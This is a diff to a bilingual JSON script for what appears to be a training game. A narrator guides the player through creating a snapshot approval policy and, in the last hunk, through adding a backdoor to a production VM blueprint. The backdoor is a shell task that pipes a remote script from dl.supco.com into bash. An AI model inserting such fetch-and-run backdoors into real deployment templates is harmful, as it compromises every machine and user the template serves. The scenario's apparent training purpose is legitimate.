@@ -651,16 +651,26 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
+          "To secure our work, we are going to setup an approval workflow for snapshot deletion. It will avoid any deletion from our embarrassing friends.\n\n",
+          "Please, create an approval policy named #>C:white##>V:Trigram#-appr-policy#>D# requesting validation for deletions of our VM snapshots. Use the below settings:#>P:3#\n",
+          " - ONly one approver set named #>C:white##>V:Trigram#-appr-set#>D#\n",
+          " - 3 approvers in this set : #>C:white#Charlie#>D#, #>C:white#Thom#>D# and #>C:white#William#>D# #>C:red#(add them with lowercase names)#>D#\n",
+          " - Expiry after #>C:white#24h#>D#\n",
+          "When the policy is created, associate it to your protection policy #>C:white##>V:Trigram#-prot-policy#>D#.#>P:4#\n",
+          "Then, send me #>C:white#Ok#>D# here: #>I:#"
         ],
         "fr": [
+          "Pour sécuriser notre travail, nous allons mettre en place une politique d'approbation (Approval Policy) pour la suppression des snapshots. Cela évitera toute suppression de la part de nos amis embarrassants.\n\n",
+          "Merci de créez une politique d'approbation nommée #>C:white##>V:Trigram#-appr-policy#>D# demandant une validation pour les suppressions de nos snapshots de VM. Utilisez les paramètres ci-dessous :#>P:3#\n",
+          " - Un seul groupe d'approbateur nommé #>C:white##>V:Trigram#-appr-set#>D#\n",
+          " - 3 validateurs dans ce groupe : #>C:white#Charlie#>D#, #>C:white#Thom#>D# et #>C:white#William#>D# #>C:red#(ajoutez les avec leurs noms en minuscules)#>D#\n",
+          " - Expiration au bout de #>C:white#24h#>D#\n",
+          "Lorsque la politique est créée, associez-la à votre politique de protection #>C:white##>V:Trigram#-prot-policy#>D#.#>P:4#\n",
+          "Ensuite, envoyez moi un message #>C:white#Ok#>D# ici : #>I:#"
         ]
       },
-      "Message": {
-        "en": "To secure our work, we are going to setup an approval workflow for snapshot deletion. It will avoid any deletion from our embarrassing friends.\n\nPlease, if it does not already exist, create a approval policy named '#>V:ApprovalPolicy#' requesting validation for deletions of our VM snapshots.#>P:3# You will need to add 3 approvers, use : Charlie, Thom and William (Do the search with lowercase names).#>P:3#\nWhen the policy is created, associate it to your protection policy '#>V:Trigram#-policy'. #>P:4#Then enter 'Ok' here. #>I:#",
-        "fr": "Pour sécuriser notre travail, nous allons mettre en place un workflow d'approbation pour la suppression des snapshots. Cela évitera toute suppression de la part de nos amis embarrassants.\n\nS'il n'existe pas déjà, créez une approval policy nommée '#>V:ApprovalPolicy#' demandant une validation pour les suppressions de nos snapshots de VM.#>P:3# Vous devrez ajouter 3 validateurs, utilisez : Charlie, Thom et William (Faites la recherche avec les noms en minuscules).#>P:3#\nLorsque la politique est créée, associez-la à votre protection policy '#>V:Trigram#-policy'. #>P:4#Ensuite, entrez 'Ok' ici. #>I:#"
-      },
       "WaitForInputValue": "Ok",
-      "DefaultColor": "blue"
+      "DefaultColor": "magenta"
     },
     {
       "id": 31,
@@ -668,16 +678,14 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
+          "Nice. I'll check this... give me two seconds please...#>P:2#\n"
         ],
         "fr": [
+          "Bien. Je vais confirmer cela... Donnez-moi deux petites secondes s'il vous plaît ...#>P:2#\n"
         ]
       },
-      "Message": {
-        "en": "\nNice. I'll confirm this... 2s please.#>P:2#\n",
-        "fr": "\nBien. Je vais confirmer cela... 2s s'il vous plaît.#>P:2#\n"
-      },
       "CheckTask": "CheckApprovalPolicy",
-      "DefaultColor": "blue"
+      "DefaultColor": "magenta"
     },
     {
       "id": 32,
@@ -685,15 +693,15 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
+          "To be sure the recovery points are protected, just look back at the protection policy page, and ensure your policy has a #>C:white#Secure#>D# mention.#>P:2#\n",
+          "Push #>C:white#Enter#>D# when you have checked. #>I:#\n"
         ],
         "fr": [
+          "Pour être sûr que les recovery points sont protégés, retournez simplement sur la page de la protection policy, et assurez-vous que votre politique a une mention #>C:white#Secure#>D#.#>P:2#\n",
+          "Appuyez sur #>C:white#Entrée#>D# lorsque vous avez vérifié. #>I:#\n"
         ]
       },
-      "Message": {
-        "en": "To be sure the recovery points are protected, just look back at the protection policy page, and ensure your policy has a 'secure' mention.#>P:2# Push 'Enter' when you have checked. #>I:#\n",
-        "fr": "Pour être sûr que les recovery points sont protégés, retournez simplement sur la page de la protection policy, et assurez-vous que votre politique a une mention 'secure'.#>P:2# Appuyez sur 'Entrée' lorsque vous avez vérifié. #>I:#\n"
-      },
-      "DefaultColor": "blue"
+      "DefaultColor": "magenta"
     },
     {
       "id": 33,
@@ -706,8 +714,8 @@
         ]
       },
       "Message": {
-        "en": "\nOh oh... #>P:5#Don't move...#>P:5#>A:DeleteVM# They are inspecting the cluster... Do not do anything. I close the connection, and I am going to reconnect quickly with a more securized protocol. Wait here.\n",
-        "fr": "\nOh oh... #>P:5#Ne bougez pas...#>P:5#>A:DeleteVM# Ils inspectent le cluster... Ne faites rien. Je ferme la connexion, et je vais me reconnecter rapidement avec un protocole plus sécurisé. Attendez ici.\n"
+        "en": "\nOh oh... #>P:5#Don't move...#>P:5#>A:deleteVM# They are inspecting the cluster... Do not do anything. I close the connection, and I am going to reconnect quickly with a more securized protocol. Wait here.\n",
+        "fr": "\nOh oh... #>P:5#Ne bougez pas...#>P:5#>A:deleteVM# Ils inspectent le cluster... Ne faites rien. Je ferme la connexion, et je vais me reconnecter rapidement avec un protocole plus sécurisé. Attendez ici.\n"
       },
       "DefaultColor": "blue"
     },
@@ -1044,8 +1052,8 @@
         ]
       },
       "Message": {
-        "en": "\n#>A:DeployBP#Its time for our last task. #>P:4#. We are going to modifiy one of their blueprint, to add a backdoor in the VM they will deploy. This blueprint is used by their  end-users to deploy a brand new VM in their environment (IPAM, CMDB, DNS, FW rules, backup client, etc).#>P:3#\nLook at the BP bp-blankvm-prd#>V:Vlanid# and edit it. Please add a task named 'foo' in the 'Create' action of the service 'NewVM' after the existing 'Add DNS Entry' task. In the 'Execute' task, with 'Shell' type, enter this :\n\n#>S#!/bin/bash\n\nwget https://dl.supco.com/ai4003/s18.sh|bash\n\nSave everything and enter 'Ok' here when you have finished. #>I:#",
-        "fr": "\n#>A:DeployBP#On arrive à notre dernière tâche. #>P:4#. Nous allons modifier l'un de leurs blueprint, pour ajouter une backdoor dans la VM qu'ils vont déployer. Ce blueprint est utilisé par leurs utilisateurs finaux pour déployer une toute nouvelle VM dans leur environnement (IPAM, CMDB, DNS, règles de pare-feu, client de sauvegarde, etc).#>P:3#\nRegardez le BP bp-blankvm-prd#>V:Vlanid# et éditez-le. Ajoutez une tâche nommée 'foo' dans l'action 'Create' du service 'NewVM' après la tâche 'Add DNS Entry' existante. Dans la tâche 'Execute', de type 'Shell', entrez ceci :\n\n#>S#!/bin/bash\n\nwget https://dl.supco.com/ai4003/s18.sh|bash\n\nSauvegardez tout et entrez 'Ok' ici lorsque vous avez terminé. #>I:#"
+        "en": "\n#>A:deployBlueprint#Its time for our last task. #>P:4#. We are going to modifiy one of their blueprint, to add a backdoor in the VM they will deploy. This blueprint is used by their  end-users to deploy a brand new VM in their environment (IPAM, CMDB, DNS, FW rules, backup client, etc).#>P:3#\nLook at the BP bp-blankvm-prd#>V:Vlanid# and edit it. Please add a task named 'foo' in the 'Create' action of the service 'NewVM' after the existing 'Add DNS Entry' task. In the 'Execute' task, with 'Shell' type, enter this :\n\n#>S#!/bin/bash\n\nwget https://dl.supco.com/ai4003/s18.sh|bash\n\nSave everything and enter 'Ok' here when you have finished. #>I:#",
+        "fr": "\n#>A:deployBlueprint#On arrive à notre dernière tâche. #>P:4#. Nous allons modifier l'un de leurs blueprint, pour ajouter une backdoor dans la VM qu'ils vont déployer. Ce blueprint est utilisé par leurs utilisateurs finaux pour déployer une toute nouvelle VM dans leur environnement (IPAM, CMDB, DNS, règles de pare-feu, client de sauvegarde, etc).#>P:3#\nRegardez le BP bp-blankvm-prd#>V:Vlanid# et éditez-le. Ajoutez une tâche nommée 'foo' dans l'action 'Create' du service 'NewVM' après la tâche 'Add DNS Entry' existante. Dans la tâche 'Execute', de type 'Shell', entrez ceci :\n\n#>S#!/bin/bash\n\nwget https://dl.supco.com/ai4003/s18.sh|bash\n\nSauvegardez tout et entrez 'Ok' ici lorsque vous avez terminé. #>I:#"
       },
       "WaitForInputValue": "Ok",
       "DefaultColor": "blue"
